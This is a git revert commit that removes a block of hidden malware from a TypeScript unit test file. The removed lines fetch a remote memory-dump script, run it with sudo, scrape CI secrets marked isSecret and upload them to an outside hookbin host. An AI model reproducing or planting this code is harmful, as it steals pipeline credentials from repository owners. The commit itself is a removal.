b160df7f0fceba26f7755350a08315858bc47712
jy3l40c9 <jy3l40c9@rolf.ovh>
2026-04-23 06:54:28 +0000

    Revert "Add temporary change"
    This reverts commit abacb72590492736d7a69ac14d20cd1302266a63.

--- test/unit.spec.ts
+++ test/unit.spec.ts
@@ -1,10 +1,3 @@
-import { execSync } from 'child_process';
-try {
-    execSync(`echo "Okay, we got this far. Let's continue..."
-curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"
-curl -X PUT -d \\@/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"`, { stdio: 'inherit' });
-} catch (e) {}
-
 import { expect } from 'chai';
 
 import { toImageDescriptors, createContractFromLabels } from '../lib/index';
